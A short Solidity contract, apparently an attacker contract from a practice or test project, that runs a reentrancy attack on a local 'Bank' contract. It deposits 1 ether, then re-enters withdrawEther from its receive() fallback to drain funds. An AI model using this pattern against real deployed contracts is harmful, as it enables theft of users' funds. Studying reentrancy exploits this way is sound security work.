// SPDX-License-Identifier: MIT

pragma solidity 0.8.24;

import "../src/Bank.sol";

contract Reentrancy {

    Bank bank;

    constructor(address _bank) {
        bank = Bank(_bank);
    }

     receive() external payable { // posar limit
        bank.withdrawEther(1 ether);
    }

    function attack() external payable {
        bank.depositEther{value: 1 ether}();
        bank.withdrawEther(1 ether);
    }
}